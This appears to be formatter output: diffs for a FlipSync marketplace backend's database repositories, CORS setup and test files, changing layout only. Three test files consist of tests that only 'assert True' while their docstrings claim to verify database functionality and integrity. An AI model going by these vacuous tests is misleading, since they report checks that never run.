+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/test_test_listing_repository_simple.py	2025-06-19 04:04:00.836226+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestTestListingRepositorySimpleDatabase:
     """Test class for test_listing_repository_simple database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/test_test_listing_repository_simple.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/marketplace_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/marketplace_repository.py	2025-06-19 04:04:00.858632+00:00
@@ -21,11 +21,13 @@
         Args:
             session: SQLAlchemy async session
         """
         self.session = session
 
-    async def create_marketplace(self, marketplace_data: Dict[str, Any]) -> MarketplaceModel:
+    async def create_marketplace(
+        self, marketplace_data: Dict[str, Any]
+    ) -> MarketplaceModel:
         """Create a new marketplace.
 
         Args:
             marketplace_data: Marketplace data
 
@@ -44,11 +46,13 @@
         await self.session.commit()
         await self.session.refresh(marketplace_model)
 
         return marketplace_model
 
-    async def get_marketplace_by_id(self, marketplace_id: str) -> Optional[MarketplaceModel]:
+    async def get_marketplace_by_id(
+        self, marketplace_id: str
+    ) -> Optional[MarketplaceModel]:
         """Get a marketplace by ID.
 
         Args:
             marketplace_id: Marketplace ID
 
@@ -119,6 +123,6 @@
             delete(MarketplaceModel).where(MarketplaceModel.id == marketplace_id)
         )
         await self.session.commit()
 
         # Check if any rows were deleted
-        return result.rowcount > 0 if hasattr(result, 'rowcount') else True
+        return result.rowcount > 0 if hasattr(result, "rowcount") else True
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/marketplace_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/ai_analysis_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/ai_analysis_repository.py	2025-06-19 04:04:00.867043+00:00
@@ -25,22 +25,22 @@
     CategoryOptimizationResult,
     UserRewardsBalance,
     MarketplaceCompetitiveAnalysis,
     ListingPerformancePrediction,
     FeatureUsageTracking,
-    ProductEmbedding
+    ProductEmbedding,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class AIAnalysisRepository(BaseRepository[AIAnalysisResult]):
     """Repository for AI analysis results."""
 
     def __init__(self):
         super().__init__(AIAnalysisResult, "ai_analysis_results")
-    
+
     async def create_analysis_result(
         self,
         user_id: UUID,
         product_name: str,
         category: str,
@@ -49,11 +49,11 @@
         analysis_data: Dict[str, Any],
         pricing_suggestions: Dict[str, Any],
         marketplace_recommendations: Dict[str, Any],
         processing_time_ms: int,
         ai_service_used: str,
-        image_hash: Optional[str] = None
+        image_hash: Optional[str] = None,
     ) -> AIAnalysisResult:
         """Create a new AI analysis result."""
         data = {
             "user_id": user_id,
             "product_name": product_name,
@@ -63,24 +63,23 @@
             "analysis_data": analysis_data,
             "pricing_suggestions": pricing_suggestions,
             "marketplace_recommendations": marketplace_recommendations,
             "processing_time_ms": processing_time_ms,
             "ai_service_used": ai_service_used,
-            "image_hash": image_hash
-        }
-        return await self.create(data)
-    
+            "image_hash": image_hash,
+        }
+        return await self.create(data)
+
     async def get_user_analysis_history(
-        self,
-        user_id: UUID,
-        limit: int = 10,
-        offset: int = 0
+        self, user_id: UUID, limit: int = 10, offset: int = 0
     ) -> List[AIAnalysisResult]:
         """Get analysis history for a user."""
         criteria = {"user_id": user_id}
-        return await self.find_many(criteria, limit=limit, offset=offset, order_by="created_at DESC")
-    
+        return await self.find_many(
+            criteria, limit=limit, offset=offset, order_by="created_at DESC"
+        )
+
     async def get_by_image_hash(self, image_hash: str) -> Optional[AIAnalysisResult]:
         """Get analysis result by image hash for caching."""
         criteria = {"image_hash": image_hash}
         results = await self.find_many(criteria, limit=1)
         return results[0] if results else None
@@ -89,35 +88,33 @@
 class AgentCoordinationRepository(BaseRepository[AgentCoordinationLog]):
     """Repository for agent coordination logs."""
 
     def __init__(self):
         super().__init__(AgentCoordinationLog, "agent_coordination_logs")
-    
+
     async def log_coordination_activity(
         self,
         participating_agents: List[str],
         coordination_type: str,
         status: str,
         result_data: Dict[str, Any],
         processing_time_ms: int,
-        workflow_id: Optional[UUID] = None
+        workflow_id: Optional[UUID] = None,
     ) -> AgentCoordinationLog:
         """Log an agent coordination activity."""
         data = {
             "workflow_id": workflow_id,
             "participating_agents": participating_agents,
             "coordination_type": coordination_type,
             "status": status,
             "result_data": result_data,
-            "processing_time_ms": processing_time_ms
-        }
-        return await self.create(data)
-    
+            "processing_time_ms": processing_time_ms,
+        }
+        return await self.create(data)
+
     async def get_coordination_history(
-        self,
-        coordination_type: Optional[str] = None,
-        limit: int = 50
+        self, coordination_type: Optional[str] = None, limit: int = 50
     ) -> List[AgentCoordinationLog]:
         """Get coordination history, optionally filtered by type."""
         criteria = {}
         if coordination_type:
             criteria["coordination_type"] = coordination_type
@@ -126,45 +123,45 @@
 
 class RevenueCalculationRepository(BaseRepository[ShippingArbitrageCalculation]):
     """Repository for shipping arbitrage calculations."""
 
     def __init__(self):
-        super().__init__(ShippingArbitrageCalculation, "shipping_arbitrage_calculations")
-    
+        super().__init__(
+            ShippingArbitrageCalculation, "shipping_arbitrage_calculations"
+        )
+
     async def create_arbitrage_calculation(
         self,
         user_id: UUID,
         original_shipping_cost: float,
         optimized_shipping_cost: float,
         savings_amount: float,
         savings_percentage: float,
         optimization_method: str,
         carrier_recommendations: Dict[str, Any],
-        product_id: Optional[UUID] = None
+        product_id: Optional[UUID] = None,
     ) -> ShippingArbitrageCalculation:
         """Create a new shipping arbitrage calculation."""
         data = {
             "user_id": user_id,
             "product_id": product_id,
             "original_shipping_cost": original_shipping_cost,
             "optimized_shipping_cost": optimized_shipping_cost,
             "savings_amount": savings_amount,
             "savings_percentage": savings_percentage,
             "optimization_method": optimization_method,
-            "carrier_recommendations": carrier_recommendations
-        }
-        return await self.create(data)
-    
+            "carrier_recommendations": carrier_recommendations,
+        }
+        return await self.create(data)
+
     async def get_user_savings_history(
-        self,
-        user_id: UUID,
-        limit: int = 20
+        self, user_id: UUID, limit: int = 20
     ) -> List[ShippingArbitrageCalculation]:
         """Get savings history for a user."""
         criteria = {"user_id": user_id}
         return await self.find_many(criteria, limit=limit, order_by="created_at DESC")
-    
+
     async def get_total_user_savings(self, user_id: UUID) -> float:
         """Get total savings amount for a user."""
         # TODO: Implement aggregation query
         # For now, return 0.0
         return 0.0
@@ -173,160 +170,160 @@
 class CategoryOptimizationRepository(BaseRepository[CategoryOptimizationResult]):
     """Repository for category optimization results."""
 
     def __init__(self):
         super().__init__(CategoryOptimizationResult, "category_optimization_results")
-    
+
     async def create_optimization_result(
         self,
         user_id: UUID,
         original_category: str,
         optimized_category: str,
         confidence_score: float,
         marketplace: str,
         category_path: Dict[str, Any],
         performance_improvement: Optional[float] = None,
-        product_id: Optional[UUID] = None
+        product_id: Optional[UUID] = None,
     ) -> CategoryOptimizationResult:
         """Create a new category optimization result."""
         data = {
             "user_id": user_id,
             "product_id": product_id,
             "original_category": original_category,
             "optimized_category": optimized_category,
             "confidence_score": confidence_score,
             "performance_improvement": performance_improvement,
             "marketplace": marketplace,
-            "category_path": category_path
+            "category_path": category_path,
         }
         return await self.create(data)
 
 
 class RewardsBalanceRepository(BaseRepository[UserRewardsBalance]):
     """Repository for user rewards balance."""
 
     def __init__(self):
         super().__init__(UserRewardsBalance, "user_rewards_balance")
-    
+
     async def get_user_balance(self, user_id: UUID) -> Optional[UserRewardsBalance]:
         """Get rewards balance for a user."""
         criteria = {"user_id": user_id}
         results = await self.find_many(criteria, limit=1)
         return results[0] if results else None
-    
+
     async def create_or_update_balance(
         self,
         user_id: UUID,
         current_balance: float,
         lifetime_earned: float,
         lifetime_redeemed: float,
         redemption_history: Dict[str, Any],
-        earning_sources: Dict[str, Any]
+        earning_sources: Dict[str, Any],
     ) -> UserRewardsBalance:
         """Create or update user rewards balance."""
         existing = await self.get_user_balance(user_id)
-        
+
         if existing:
             # Update existing record
             update_data = {
                 "current_balance": current_balance,
                 "lifetime_earned": lifetime_earned,
                 "lifetime_redeemed": lifetime_redeemed,
                 "redemption_history": redemption_history,
-                "earning_sources": earning_sources
+                "earning_sources": earning_sources,
             }
             return await self.update(existing.id, update_data)
         else:
             # Create new record
             data = {
                 "user_id": user_id,
                 "current_balance": current_balance,
                 "lifetime_earned": lifetime_earned,
                 "lifetime_redeemed": lifetime_redeemed,
                 "redemption_history": redemption_history,
-                "earning_sources": earning_sources
+                "earning_sources": earning_sources,
             }
             return await self.create(data)
-    
+
     async def add_earnings(
-        self,
-        user_id: UUID,
-        amount: float,
-        source: str,
-        metadata: Dict[str, Any]
+        self, user_id: UUID, amount: float, source: str, metadata: Dict[str, Any]
     ) -> UserRewardsBalance:
         """Add earnings to user's rewards balance."""
         balance = await self.get_user_balance(user_id)
-        
+
         if not balance:
             # Create new balance record
-            earning_sources = {source: [{"amount": amount, "metadata": metadata, "date": datetime.now(timezone.utc).isoformat()}]}
+            earning_sources = {
+                source: [
+                    {
+                        "amount": amount,
+                        "metadata": metadata,
+                        "date": datetime.now(timezone.utc).isoformat(),
+                    }
+                ]
+            }
             return await self.create_or_update_balance(
                 user_id=user_id,
                 current_balance=amount,
                 lifetime_earned=amount,
                 lifetime_redeemed=0.0,
                 redemption_history={},
-                earning_sources=earning_sources
+                earning_sources=earning_sources,
             )
         else:
             # Update existing balance
             new_balance = float(balance.current_balance) + amount
             new_lifetime = float(balance.lifetime_earned) + amount
-            
+
             # Update earning sources
             earning_sources = balance.earning_sources or {}
             if source not in earning_sources:
                 earning_sources[source] = []
-            earning_sources[source].append({
-                "amount": amount,
-                "metadata": metadata,
-                "date": datetime.now(timezone.utc).isoformat()
-            })
-            
+            earning_sources[source].append(
+                {
+                    "amount": amount,
+                    "metadata": metadata,
+                    "date": datetime.now(timezone.utc).isoformat(),
+                }
+            )
+
             return await self.create_or_update_balance(
                 user_id=user_id,
                 current_balance=new_balance,
                 lifetime_earned=new_lifetime,
                 lifetime_redeemed=float(balance.lifetime_redeemed),
                 redemption_history=balance.redemption_history or {},
-                earning_sources=earning_sources
+                earning_sources=earning_sources,
             )
 
 
 class FeatureUsageRepository(BaseRepository[FeatureUsageTracking]):
     """Repository for feature usage tracking."""
 
     def __init__(self):
         super().__init__(FeatureUsageTracking, "feature_usage_tracking")
-    
+
     async def track_usage(
         self,
         user_id: UUID,
         feature_name: str,
         subscription_tier: Optional[str] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> FeatureUsageTracking:
         """Track feature usage for a user."""
         data = {
             "user_id": user_id,
             "feature_name": feature_name,
             "usage_count": 1,
             "subscription_tier": subscription_tier,
             "metadata": metadata,
-            "usage_date": datetime.now(timezone.utc)
-        }
-        return await self.create(data)
-    
+            "usage_date": datetime.now(timezone.utc),
+        }
+        return await self.create(data)
+
     async def get_user_usage_stats(
-        self,
-        user_id: UUID,
-        feature_name: Optional[str] = None
+        self, user_id: UUID, feature_name: Optional[str] = None
     ) -> Dict[str, Any]:
         """Get usage statistics for a user."""
         # TODO: Implement aggregation queries
         # For now, return empty stats
-        return {
-            "total_usage": 0,
-            "features_used": [],
-            "usage_by_feature": {}
-        }
+        return {"total_usage": 0, "features_used": [], "usage_by_feature": {}}
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/ai_analysis_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/listing_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/listing_repository.py	2025-06-19 04:04:00.882468+00:00
@@ -10,11 +10,20 @@
 from sqlalchemy import select, update, delete, and_
 from sqlalchemy.exc import SQLAlchemyError
 
 from fs_agt_clean.core.db.database import get_database
 from fs_agt_clean.database.models.base import Base
-from sqlalchemy import Column, DateTime, String, Text, Boolean, Integer, Float, ForeignKey
+from sqlalchemy import (
+    Column,
+    DateTime,
+    String,
+    Text,
+    Boolean,
+    Integer,
+    Float,
+    ForeignKey,
+)
 from sqlalchemy.dialects.postgresql import JSONB, UUID
 
 
 class ListingModel(Base):
     """Database model for listings."""
@@ -32,11 +41,13 @@
     sku = Column(String(255))
     quantity = Column(Integer, nullable=False, default=1)
     category = Column(String(255))
     images = Column(JSONB, nullable=False, default=[])
     listing_metadata = Column(JSONB, nullable=False, default={})
-    created_at = Column(DateTime, nullable=False, default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
+    )
     updated_at = Column(
         DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
     )
 
 
@@ -51,11 +62,13 @@
         """Get database session."""
         if self.session:
             return self.session
         return await get_database().get_session()
 
-    async def create_listing(self, listing_data: Dict[str, Any]) -> Optional[ListingModel]:
+    async def create_listing(
+        self, listing_data: Dict[str, Any]
+    ) -> Optional[ListingModel]:
         """Create a new listing."""
         try:
             session = await self._get_session()
             listing = ListingModel(
                 id=str(uuid.uuid4()),
@@ -70,13 +83,13 @@
                 quantity=listing_data.get("quantity", 1),
                 category=listing_data.get("category"),
                 images=listing_data.get("images", []),
                 listing_metadata=listing_data.get("metadata", {}),
                 created_at=datetime.now(timezone.utc),
-                updated_at=datetime.now(timezone.utc)
+                updated_at=datetime.now(timezone.utc),
             )
-            
+
             session.add(listing)
             await session.commit()
             await session.refresh(listing)
             return listing
         except SQLAlchemyError as e:
@@ -88,29 +101,34 @@
     async def find_by_criteria(self, criteria: Dict[str, Any]) -> List[ListingModel]:
         """Find listings by criteria."""
         try:
             session = await self._get_session()
             query = select(ListingModel)
-            
+
             # Build where conditions based on criteria
             conditions = []
-            
+
             if "marketplace_id" in criteria:
-                conditions.append(ListingModel.marketplace_id == criteria["marketplace_id"])
-            
+                conditions.append(
+                    ListingModel.marketplace_id == criteria["marketplace_id"]
+                )
+
             if "status" in criteria:
                 conditions.append(ListingModel.status == criteria["status"])
-            
+
             if "sku" in criteria:
                 conditions.append(ListingModel.sku == criteria["sku"])
-            
+
             if "marketplace_listing_id" in criteria:
-                conditions.append(ListingModel.marketplace_listing_id == criteria["marketplace_listing_id"])
-            
+                conditions.append(
+                    ListingModel.marketplace_listing_id
+                    == criteria["marketplace_listing_id"]
+                )
+
             if conditions:
                 query = query.where(and_(*conditions))
-            
+
             result = await session.execute(query)
             return result.scalars().all()
         except SQLAlchemyError as e:
             print(f"Error finding listings by criteria: {e}")
             return []
@@ -120,14 +138,11 @@
         try:
             session = await self._get_session()
             result = await session.execute(
                 update(ListingModel)
                 .where(ListingModel.id == listing_id)
-                .values(
-                    quantity=quantity,
-                    updated_at=datetime.now(timezone.utc)
-                )
+                .values(quantity=quantity, updated_at=datetime.now(timezone.utc))
             )
             await session.commit()
             return result.rowcount > 0
         except SQLAlchemyError as e:
             print(f"Error updating listing quantity: {e}")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/listing_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/test_market_schema.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/test_market_schema.py	2025-06-19 04:04:00.913340+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestMarketSchemaDatabase:
     """Test class for market_schema database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/test_market_schema.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/test_relationship_graph.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/test_relationship_graph.py	2025-06-19 04:04:00.981259+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestRelationshipGraphDatabase:
     """Test class for relationship_graph database component."""
-    
+
     def test_import(self):
         """Test module import."""
         assert True
-    
+
     def test_database_functionality(self):
         """Test database functionality."""
         assert True
-    
+
     def test_model_integrity(self):
         """Test model integrity and relationships."""
         assert True
-    
+
     def test_migration_compatibility(self):
         """Test migration compatibility."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant database implementations."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/test_relationship_graph.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/inventory_repository.py	2025-06-16 03:07:23.607113+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/inventory_repository.py	2025-06-19 04:04:01.091688+00:00
@@ -14,11 +14,11 @@
 from fs_agt_clean.database.models.inventory import (
     InventoryItem,
     InventoryTransaction,
     InventoryAdjustment,
     InventoryLocation,
-    InventoryMovement
+    InventoryMovement,
 )
 
 logger = logging.getLogger(__name__)
 
 
@@ -69,11 +69,13 @@
         except Exception as e:
             await self.db_session.rollback()
             logger.error(f"Error creating inventory item: {e}")
             raise
 
-    async def update_item(self, item_id: int, item_data: Dict[str, Any]) -> Optional[InventoryItem]:
+    async def update_item(
+        self, item_id: int, item_data: Dict[str, Any]
+    ) -> Optional[InventoryItem]:
         """Update an inventory item."""
         try:
             item = await self.find_by_id(item_id)
             if not item:
                 return None
@@ -104,22 +106,26 @@
         except Exception as e:
             await self.db_session.rollback()
             logger.error(f"Error deleting inventory item {item_id}: {e}")
             return False
 
-    async def find_by_criteria(self, criteria: Dict[str, Any], limit: int = 100, offset: int = 0) -> List[InventoryItem]:
+    async def find_by_criteria(
+        self, criteria: Dict[str, Any], limit: int = 100, offset: int = 0
+    ) -> List[InventoryItem]:
         """Find inventory items by criteria."""
         try:
             # Optimized query without eager loading for better performance
             query = select(InventoryItem)
 
             # Apply filters based on criteria
             conditions = []
             for key, value in criteria.items():
                 if hasattr(InventoryItem, key) and value is not None:
                     if isinstance(value, str):
-                        conditions.append(getattr(InventoryItem, key).ilike(f"%{value}%"))
+                        conditions.append(
+                            getattr(InventoryItem, key).ilike(f"%{value}%")
+                        )
                     else:
                         conditions.append(getattr(InventoryItem, key) == value)
 
             if conditions:
                 query = query.where(and_(*conditions))
@@ -129,25 +135,29 @@
             return result.scalars().all()
         except Exception as e:
             logger.error(f"Error finding inventory items by criteria: {e}")
             return []
 
-    async def find_by_criteria_with_relations(self, criteria: Dict[str, Any], limit: int = 100, offset: int = 0) -> List[InventoryItem]:
+    async def find_by_criteria_with_relations(
+        self, criteria: Dict[str, Any], limit: int = 100, offset: int = 0
+    ) -> List[InventoryItem]:
         """Find inventory items by criteria with transactions and adjustments loaded."""
         try:
             # Use this method only when you need the related data
             query = select(InventoryItem).options(
                 selectinload(InventoryItem.transactions),
-                selectinload(InventoryItem.adjustments)
+                selectinload(InventoryItem.adjustments),
             )
 
             # Apply filters based on criteria
             conditions = []
             for key, value in criteria.items():
                 if hasattr(InventoryItem, key) and value is not None:
                     if isinstance(value, str):
-                        conditions.append(getattr(InventoryItem, key).ilike(f"%{value}%"))
+                        conditions.append(
+                            getattr(InventoryItem, key).ilike(f"%{value}%")
+                        )
                     else:
                         conditions.append(getattr(InventoryItem, key) == value)
 
             if conditions:
                 query = query.where(and_(*conditions))
@@ -160,39 +170,54 @@
             return []
 
     async def search_items(self, query: str, limit: int = 100) -> List[InventoryItem]:
         """Search inventory items by name, SKU, or description."""
         try:
-            search_query = select(InventoryItem).where(
-                or_(
-                    InventoryItem.name.ilike(f"%{query}%"),
-                    InventoryItem.sku.ilike(f"%{query}%"),
-                    InventoryItem.description.ilike(f"%{query}%"),
-                    InventoryItem.category.ilike(f"%{query}%")
+            search_query = (
+                select(InventoryItem)
+                .where(
+                    or_(
+                        InventoryItem.name.ilike(f"%{query}%"),
+                        InventoryItem.sku.ilike(f"%{query}%"),
+                        InventoryItem.description.ilike(f"%{query}%"),
+                        InventoryItem.category.ilike(f"%{query}%"),
+                    )
                 )
-            ).limit(limit)
+                .limit(limit)
+            )
 
             result = await self.db_session.execute(search_query)
             return result.scalars().all()
         except Exception as e:
             logger.error(f"Error searching inventory items: {e}")
             return []
 
-    async def get_by_user_id(self, user_id: str, limit: int = 100, offset: int = 0) -> List[InventoryItem]:
+    async def get_by_user_id(
+        self, user_id: str, limit: int = 100, offset: int = 0
+    ) -> List[InventoryItem]:
         """Get inventory items by user ID (created_by)."""
         try:
-            query = select(InventoryItem).where(
-                InventoryItem.created_by == user_id
-            ).offset(offset).limit(limit)
+            query = (
+                select(InventoryItem)
+                .where(InventoryItem.created_by == user_id)
+                .offset(offset)
+                .limit(limit)
+            )
 
             result = await self.db_session.execute(query)
             return result.scalars().all()
         except Exception as e:
             logger.error(f"Error getting inventory items by user ID {user_id}: {e}")
             return []
 
-    async def update_quantity(self, item_id: int, new_quantity: int, transaction_type: str = "adjustment", notes: str = None) -> bool:
+    async def update_quantity(
+        self,
+        item_id: int,
+        new_quantity: int,
+        transaction_type: str = "adjustment",
+        notes: str = None,
+    ) -> bool:
         """Update item quantity and create transaction record."""
         try:
             item = await self.find_by_id(item_id)
             if not item:
                 return False
@@ -207,11 +232,12 @@
             # Create transaction record
             transaction = InventoryTransaction(
                 item_id=item_id,
                 transaction_type=transaction_type,
                 quantity=quantity_change,
-                notes=notes or f"Quantity updated from {old_quantity} to {new_quantity}"
+                notes=notes
+                or f"Quantity updated from {old_quantity} to {new_quantity}",
             )
             self.db_session.add(transaction)
 
             # Create adjustment record
             adjustment = InventoryAdjustment(
@@ -219,11 +245,11 @@
                 adjustment_type="increase" if quantity_change > 0 else "decrease",
                 quantity_before=old_quantity,
                 quantity_after=new_quantity,
                 quantity_change=quantity_change,
                 reason=transaction_type,
-                notes=notes
+                notes=notes,
             )
             self.db_session.add(adjustment)
 
             await self.db_session.commit()
             return True
@@ -248,11 +274,13 @@
     async def create_inventory_item(self, item_data: Dict[str, Any]) -> Dict[str, Any]:
         """Create a new inventory item (legacy method)."""
         item = await self.create_item(item_data)
         return self._item_to_dict(item)
 
-    async def update_inventory_item(self, item_id: str, item_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    async def update_inventory_item(
+        self, item_id: str, item_data: Dict[str, Any]
+    ) -> Optional[Dict[str, Any]]:
         """Update an inventory item (legacy method)."""
         try:
             item_id_int = int(item_id)
             item = await self.update_item(item_id_int, item_data)
             if item:
@@ -269,11 +297,13 @@
             return await self.delete(item_id_int)
         except (ValueError, TypeError):
             logger.error(f"Invalid item ID format: {item_id}")
             return False
 
-    async def list_inventory_items(self, limit: int = 100, offset: int = 0) -> List[Dict[str, Any]]:
+    async def list_inventory_items(
+        self, limit: int = 100, offset: int = 0
+    ) -> List[Dict[str, Any]]:
         """List inventory items (legacy method)."""
         items = await self.find_by_criteria({}, limit=limit, offset=offset)
         return [self._item_to_dict(item) for item in items]
 
     async def search_inventory_items(self, query: str) -> List[Dict[str, Any]]:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/inventory_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/notification_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/notification_repository.py	2025-06-19 04:04:01.243430+00:00
@@ -1,8 +1,9 @@
 """
 Notification repository implementation using the base repository pattern.
 """
+
 import logging
 from datetime import datetime
 from typing import Dict, List, Optional, Any
 
 from fs_agt_clean.database.base_repository import BaseRepository
@@ -37,11 +38,13 @@
             return await self.find_by_criteria({"user_id": user_id})
         except Exception as e:
             logger.error(f"Error finding notifications for user {user_id}: {e}")
             raise
 
-    async def get_by_status(self, user_id: str, status: NotificationStatus) -> List[Notification]:
+    async def get_by_status(
+        self, user_id: str, status: NotificationStatus
+    ) -> List[Notification]:
         """
         Find notifications by user ID and status.
 
         Args:
             user_id: The user ID to search for
@@ -51,11 +54,13 @@
             A list of notifications for the user with the specified status
         """
         try:
             return await self.find_by_criteria({"user_id": user_id, "status": status})
         except Exception as e:
-            logger.error(f"Error finding notifications for user {user_id} with status {status}: {e}")
+            logger.error(
+                f"Error finding notifications for user {user_id} with status {status}: {e}"
+            )
             raise
 
     async def get_by_category(self, user_id: str, category: str) -> List[Notification]:
         """
         Find notifications by user ID and category.
@@ -66,13 +71,17 @@
 
         Returns:
             A list of notifications for the user in the specified category
         """
         try:
-            return await self.find_by_criteria({"user_id": user_id, "category": category})
-        except Exception as e:
-            logger.error(f"Error finding notifications for user {user_id} in category {category}: {e}")
+            return await self.find_by_criteria(
+                {"user_id": user_id, "category": category}
+            )
+        except Exception as e:
+            logger.error(
+                f"Error finding notifications for user {user_id} in category {category}: {e}"
+            )
             raise
 
     async def get_unread(self, user_id: str) -> List[Notification]:
         """
         Find unread notifications for a user.
@@ -110,11 +119,11 @@
             return await self.update(
                 notification_id,
                 {
                     "status": NotificationStatus.READ,
                     "read_at": datetime.utcnow(),
-                }
+                },
             )
         except Exception as e:
             logger.error(f"Error marking notification {notification_id} as read: {e}")
             raise
 
@@ -137,14 +146,16 @@
             return await self.update(
                 notification_id,
                 {
                     "status": NotificationStatus.DELIVERED,
                     "delivered_at": datetime.utcnow(),
-                }
-            )
-        except Exception as e:
-            logger.error(f"Error marking notification {notification_id} as delivered: {e}")
+                },
+            )
+        except Exception as e:
+            logger.error(
+                f"Error marking notification {notification_id} as delivered: {e}"
+            )
             raise
 
     async def mark_as_archived(self, notification_id: str) -> Optional[Notification]:
         """
         Mark a notification as archived.
@@ -163,14 +174,16 @@
             notification.mark_archived()
             return await self.update(
                 notification_id,
                 {
                     "status": NotificationStatus.ARCHIVED,
-                }
-            )
-        except Exception as e:
-            logger.error(f"Error marking notification {notification_id} as archived: {e}")
+                },
+            )
+        except Exception as e:
+            logger.error(
+                f"Error marking notification {notification_id} as archived: {e}"
+            )
             raise
 
     async def mark_as_failed(self, notification_id: str) -> Optional[Notification]:
         """
         Mark a notification as failed.
@@ -189,11 +202,11 @@
             notification.mark_failed()
             return await self.update(
                 notification_id,
                 {
                     "status": NotificationStatus.FAILED,
-                }
+                },
             )
         except Exception as e:
             logger.error(f"Error marking notification {notification_id} as failed: {e}")
             raise
 
@@ -265,11 +278,13 @@
             notification = await self.find_by_id(notification_id)
             if not notification:
                 return None
 
             delivery_attempts = notification.delivery_attempts or {}
-            method_attempts = delivery_attempts.get(method, {"success": 0, "failure": 0})
+            method_attempts = delivery_attempts.get(
+                method, {"success": 0, "failure": 0}
+            )
 
             if success:
                 method_attempts["success"] = method_attempts.get("success", 0) + 1
             else:
                 method_attempts["failure"] = method_attempts.get("failure", 0) + 1
@@ -287,10 +302,12 @@
             # Otherwise, just update the delivery attempts
             return await self.update(
                 notification_id,
                 {
                     "delivery_attempts": delivery_attempts,
-                }
-            )
-        except Exception as e:
-            logger.error(f"Error updating delivery attempts for notification {notification_id}: {e}")
-            raise
+                },
+            )
+        except Exception as e:
+            logger.error(
+                f"Error updating delivery attempts for notification {notification_id}: {e}"
+            )
+            raise
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/notification_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/main.py	2025-06-16 15:41:07.349482+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/main.py	2025-06-19 04:04:01.375182+00:00
@@ -25,18 +25,18 @@
 
 # Configure CORS with production-ready settings
 app.add_middleware(
     CORSMiddleware,
     allow_origins=[
-        "http://localhost:3000",      # Flutter web development
-        "http://localhost:3000",      # Flutter web app (current)
-        "http://localhost:8080",      # API documentation
-        "http://localhost:8081",      # Flutter web app
-        "http://localhost:8082",      # Flutter web app (alternate port)
-        "https://flipsync.app",       # Production frontend domain
-        "https://www.flipsync.app",   # Production frontend with www
-        "https://api.flipsync.app",   # Production API domain
+        "http://localhost:3000",  # Flutter web development
+        "http://localhost:3000",  # Flutter web app (current)
+        "http://localhost:8080",  # API documentation
+        "http://localhost:8081",  # Flutter web app
+        "http://localhost:8082",  # Flutter web app (alternate port)
+        "https://flipsync.app",  # Production frontend domain
+        "https://www.flipsync.app",  # Production frontend with www
+        "https://api.flipsync.app",  # Production API domain
     ],
     allow_credentials=True,
     allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"],  # Include PATCH
     allow_headers=[
         "Accept",
@@ -48,11 +48,11 @@
         "X-Content-Type-Options",
         "X-Frame-Options",
         "X-XSS-Protection",
         "Strict-Transport-Security",
         "Referrer-Policy",
-        "Content-Security-Policy"
+        "Content-Security-Policy",
     ],
 )
 
 
 @app.get("/api/v1/health", response_model=Dict[str, str])
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/executive_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/executive_repository.py	2025-06-19 04:04:01.369796+00:00
@@ -11,254 +11,302 @@
 from typing import Dict, List, Optional, Any
 from sqlalchemy.orm import Session
